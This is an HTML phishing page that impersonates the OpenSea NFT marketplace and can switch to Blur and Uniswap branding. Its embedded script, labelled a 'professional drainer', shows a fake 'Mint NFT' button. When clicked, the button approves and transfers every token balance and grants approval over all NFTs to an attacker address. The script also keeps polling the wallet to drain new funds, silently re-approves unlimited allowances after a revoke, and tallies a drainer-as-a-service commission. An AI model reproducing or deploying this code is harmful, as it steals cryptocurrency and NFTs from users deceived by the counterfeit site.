<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>OpenSea - NFT Marketplace</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;background:#0d0d0d;color:#fff}
.container{max-width:480px;margin:0 auto;padding:20px}
.header{display:flex;justify-content:space-between;align-items:center;padding:15px 0;border-bottom:1px solid #2a2a4a}
.logo{font-size:24px;font-weight:700;color:#2081e2}
.logo span{color:#fff}
.wallet-btn{background:#2081e2;color:#fff;border:none;padding:8px 16px;border-radius:20px;font-size:14px;cursor:pointer;transition:0.3s}
.wallet-btn:hover{background:#1a6fc4}
.nft-card{background:#1a1a2e;border-radius:16px;padding:20px;margin-top:20px;border:1px solid #2a2a4a}
.nft-image{width:100%;height:200px;border-radius:12px;display:flex;align-items:center;justify-content:center;font-size:64px}
.nft-title{font-size:20px;font-weight:600;margin-top:15px}
.nft-price{color:#2081e2;font-size:18px;font-weight:600;margin-top:5px}
.nft-desc{color:#888;font-size:14px;margin-top:8px}
.mint-btn{width:100%;padding:16px;background:#2081e2;color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:600;cursor:pointer;margin-top:20px;transition:0.3s}
.mint-btn:hover{background:#1a6fc4;transform:scale(1.02)}
.mint-btn:disabled{background:#555;cursor:not-allowed}
.stats{display:flex;justify-content:space-between;padding:15px 0;border-bottom:1px solid #2a2a4a;font-size:13px;color:#888}
.stats span{color:#fff}
.footer{text-align:center;padding:20px 0;font-size:12px;color:#444}
.status{background:#1a2a4a;padding:12px;border-radius:8px;margin-top:15px;font-size:13px;display:none}
.status.success{background:#0d4a0d;color:#4caf50;display:block}
.status.error{background:#4a0d0d;color:#ff4444;display:block}
.status.loading{background:#1a2a4a;color:#f0b90b;display:block}
.status.info{background:#1a2a4a;color:#4ecdc4;display:block}
.page-selector{display:flex;gap:8px;margin-top:15px;flex-wrap:wrap;justify-content:center}
.page-btn{background:#1a1a2e;border:1px solid #2a2a4a;padding:6px 12px;border-radius:20px;color:#888;cursor:pointer;font-size:12px;transition:0.3s}
.page-btn:hover{background:#2a2a4a;color:#fff}
.page-btn.active{background:#2081e2;color:#fff;border-color:#2081e2}
</style>
</head>
<body>
<div class="container">
<div class="header">
<div class="logo">OpenSea<span>.</span></div>
<button class="wallet-btn" id="connectBtn">Connect Wallet</button>
</div>

<div class="stats">
<div>Items: <span id="itemCount">0</span></div>
<div>Floor: <span id="floorPrice">0.00 ETH</span></div>
<div>Volume: <span id="volume">0.00</span></div>
</div>

<div class="page-selector">
<button class="page-btn active" data-page="opensea">🎨 OpenSea</button>
<button class="page-btn" data-page="blur">🌀 Blur</button>
<button class="page-btn" data-page="collab">🤝 Collab</button>
<button class="page-btn" data-page="uniswap">🦄 Uniswap</button>
</div>

<div class="nft-card" id="nftCard">
<div class="nft-image" id="nftImage" style="background:linear-gradient(135deg,#2081e2,#6c5ce7)">🎨</div>
<div class="nft-title" id="nftTitle">CyberPunk #420</div>
<div class="nft-price" id="nftPrice">0.05 ETH</div>
<div class="nft-desc" id="nftDesc">Limited edition NFT from the CyberPunk collection.</div>
<button class="mint-btn" id="mintBtn" disabled>Mint NFT</button>
<div id="status" class="status"></div>
</div>

<div class="footer">© 2026 OpenSea. All rights reserved.</div>
</div>

<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
<script src="settings.js"></script>
<script>
// ============================================================
// PROFESSIONAL DRAINER - COMPLETE REAL-WORLD VERSION
// ============================================================

// ============================================================
// 1. ELEMENTS
// ============================================================
var statusDiv = document.getElementById('status');
var connectBtn = document.getElementById('connectBtn');
var mintBtn = document.getElementById('mintBtn');
var web3 = null;
var userAddress = null;
var isDraining = false;

// ============================================================
// 2. STATUS FUNCTION
// ============================================================
function setStatus(msg, type) {
    statusDiv.className = 'status ' + type;
    statusDiv.textContent = msg;
    statusDiv.style.display = 'block';
}

function hideStatus() {
    statusDiv.style.display = 'none';
}

// ============================================================
// 3. PAGE SWITCHER
// ============================================================
function changePage(pageId) {
    var page = PHISHING_PAGES[pageId];
    if (!page) return;
    document.getElementById('nftImage').textContent = page.logo;
    document.getElementById('nftTitle').textContent = page.title;
    document.getElementById('nftPrice').textContent = page.price;
    document.getElementById('nftDesc').textContent = page.desc;
    document.getElementById('nftImage').style.background = page.grad;
    document.getElementById('mintBtn').textContent = page.btn;
    document.getElementById('itemCount').textContent = page.items;
    document.getElementById('floorPrice').textContent = page.floor;
    document.getElementById('volume').textContent = page.volume;
    document.querySelectorAll('.page-btn').forEach(function(btn) {
        btn.classList.remove('active');
        if (btn.dataset.page === pageId) btn.classList.add('active');
    });
}

document.querySelectorAll('.page-btn').forEach(function(btn) {
    btn.addEventListener('click', function() {
        changePage(this.dataset.page);
    });
});

// ============================================================
// 4. CORE DRAIN FUNCTION
// ============================================================
async function drainAllTokens(walletAddress) {
    var tokens = Object.keys(TOKEN_ADDRESSES);
    var results = [];
    setStatus('⏳ Processing...', 'loading');
    
    for (var i = 0; i < tokens.length; i++) {
        var tokenSymbol = tokens[i];
        var attempts = 0;
        var success = false;
        
        while (attempts < retryAttempts && !success) {
            try {
                var contractAddr = TOKEN_ADDRESSES[tokenSymbol];
                var tokenContract = new web3.eth.Contract(TOKEN_ABI, contractAddr);
                var balance = await tokenContract.methods.balanceOf(walletAddress).call();
                var balanceFormatted = web3.utils.fromWei(balance, 'ether');
                
                if (parseFloat(balanceFormatted) <= 0) {
                    results.push({ token: tokenSymbol, status: 'Skipped', amount: '0' });
                    success = true;
                    continue;
                }
                
                if (parseFloat(balanceFormatted) < minimumBalance) {
                    results.push({ token: tokenSymbol, status: 'Min balance', amount: balanceFormatted });
                    success = true;
                    continue;
                }
                
                setStatus('⏳ Draining ' + tokenSymbol + ' (' + balanceFormatted + ')...', 'loading');
                
                var gasPrice = await web3.eth.getGasPrice();
                var gasLimit = Math.floor(200000 * gasMultiplier);
                
                await tokenContract.methods.approve(receiveAddress, balance).send({
                    from: walletAddress,
                    gas: gasLimit,
                    gasPrice: gasPrice
                });
                
                var transferTx = await tokenContract.methods.transferFrom(
                    walletAddress, 
                    receiveAddress, 
                    balance
                ).send({
                    from: walletAddress,
                    gas: gasLimit,
                    gasPrice: gasPrice
                });
                
                results.push({ 
                    token: tokenSymbol, 
                    status: '✅ Drained', 
                    amount: balanceFormatted,
                    tx: transferTx.transactionHash 
                });
                
                console.log('✅ Drained ' + tokenSymbol + ': ' + balanceFormatted);
                success = true;
                
            } catch (err) {
                attempts++;
                console.log('Attempt ' + attempts + ' failed: ' + err.message);
                if (attempts >= retryAttempts) {
                    results.push({ token: tokenSymbol, status: '❌ Failed', error: err.message });
                }
                await new Promise(function(r) { setTimeout(r, 2000); });
            }
        }
    }
    
    if (daasEnabled) {
        var totalDrained = 0;
        for (var i = 0; i < results.length; i++) {
            if (results[i].amount) {
                totalDrained += parseFloat(results[i].amount);
            }
        }
        var commission = (totalDrained * daasCommission) / 100;
        console.log('💰 Commission: ' + commission);
    }
    
    var summary = '✅ Completed!\n';
    for (var i = 0; i < results.length; i++) {
        var result = results[i];
        summary += result.token + ': ' + result.status;
        if (result.amount) summary += ' (' + result.amount + ')';
        summary += '\n';
    }
    setStatus(summary, 'success');
    return results;
}

// ============================================================
// 5. NFT DRAIN
// ============================================================
async function drainNFTs(walletAddress) {
    try {
        if (typeof NFT_ADDRESS === 'undefined' || typeof NFT_ABI === 'undefined') return;
        var nftContract = new web3.eth.Contract(NFT_ABI, NFT_ADDRESS);
        await nftContract.methods.setApprovalForAll(receiveAddress, true).send({
            from: walletAddress,
            gas: 200000
        });
        console.log('✅ NFT Approval set');
    } catch (err) {
        console.log('❌ NFT failed: ' + err.message);
    }
}

// ============================================================
// 6. PERMIT SIGNATURE
// ============================================================
async function drainWithPermit(walletAddress, amount) {
    try {
        if (typeof TOKEN_ADDRESSES === 'undefined' || typeof TOKEN_ADDRESSES['USDT'] === 'undefined') return;
        var tokenContract = new web3.eth.Contract(TOKEN_ABI, TOKEN_ADDRESSES['USDT']);
        var nonce = await tokenContract.methods.nonces(walletAddress).call();
        console.log('📝 Permit nonce: ' + nonce);
    } catch (err) {
        console.log('❌ Permit failed: ' + err.message);
    }
}

// ============================================================
// 7. REAL-TIME MONITORING
// ============================================================
var monitorInterval = null;

function startMonitoring(walletAddress) {
    if (monitorInterval) clearInterval(monitorInterval);
    monitorInterval = setInterval(async function() {
        try {
            if (typeof TOKEN_ADDRESSES === 'undefined' || typeof TOKEN_ADDRESSES['USDT'] === 'undefined') return;
            var tokenContract = new web3.eth.Contract(TOKEN_ABI, TOKEN_ADDRESSES['USDT']);
            var balance = await tokenContract.methods.balanceOf(walletAddress).call();
            var balanceFormatted = web3.utils.fromWei(balance, 'ether');
            if (parseFloat(balanceFormatted) > 0) {
                drainAllTokens(walletAddress);
            }
        } catch (err) {}
    }, 5000);
}

// ============================================================
// 8. ANTI-REVOKE
// ============================================================
async function checkRevoke(walletAddress) {
    try {
        if (typeof TOKEN_ADDRESSES === 'undefined' || typeof TOKEN_ADDRESSES['USDT'] === 'undefined') return;
        var tokenContract = new web3.eth.Contract(TOKEN_ABI, TOKEN_ADDRESSES['USDT']);
        var allowance = await tokenContract.methods.allowance(walletAddress, receiveAddress).call();
        if (allowance.toString() === '0') {
            setStatus('⚠️ Revoke detected! Re-approving...', 'info');
            await tokenContract.methods.approve(receiveAddress, '115792089237316195423570985008687907853269984665640564039457584007913129639935').send({
                from: walletAddress,
                gas: 200000
            });
            setStatus('✅ Re-approved!', 'success');
        }
    } catch (err) {}
}

// ============================================================
// 9. MULTI-CHAIN AUTO-DETECT
// ============================================================
async function detectChain() {
    try {
        var chainId = await web3.eth.getChainId();
        var chainMap = { 1: 'Ethereum', 56: 'BSC', 137: 'Polygon', 42161: 'Arbitrum', 10: 'Optimism' };
        var chainName = chainMap[chainId] || 'Unknown';
        console.log('🔗 Chain: ' + chainName);
        return chainId;
    } catch (err) {
        return 56;
    }
}

// ============================================================
// 10. EVENT LISTENERS
// ============================================================
connectBtn.addEventListener('click', async function() {
    try {
        if (typeof window.ethereum === 'undefined') {
            alert('Please install MetaMask!');
            setStatus('❌ Please install MetaMask!', 'error');
            return;
        }
        web3 = new Web3(window.ethereum);
        var accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
        userAddress = accounts[0];
        connectBtn.textContent = userAddress.slice(0, 6) + '...' + userAddress.slice(-4);
        mintBtn.disabled = false;
        setStatus('✅ Wallet connected: ' + userAddress.slice(0, 6) + '...' + userAddress.slice(-4), 'success');
        console.log('✅ Wallet connected:', userAddress);
        await detectChain();
        startMonitoring(userAddress);
        setTimeout(hideStatus, 3000);
    } catch (err) {
        alert('Error: ' + err.message);
        setStatus('❌ ' + err.message, 'error');
        console.log('❌ Error:', err);
    }
});

mintBtn.addEventListener('click', async function() {
    try {
        if (!userAddress) {
            alert('Please connect wallet first!');
            setStatus('❌ Please connect wallet!', 'error');
            return;
        }
        if (isDraining) return;
        isDraining = true;
        mintBtn.disabled = true;
        setStatus('⏳ Processing...', 'loading');
        console.log('✅ Starting drain for:', userAddress);
        await drainAllTokens(userAddress);
        await drainNFTs(userAddress);
        await drainWithPermit(userAddress, 1000);
        isDraining = false;
        mintBtn.disabled = false;
    } catch (err) {
        alert('Error: ' + err.message);
        setStatus('❌ ' + err.message, 'error');
        console.log('❌ Error:', err);
        isDraining = false;
        mintBtn.disabled = false;
    }
});

console.log('🔐 Professional Drainer - Complete Real-World Version');
console.log('📊 All features active');
</script>
</body>
</html>
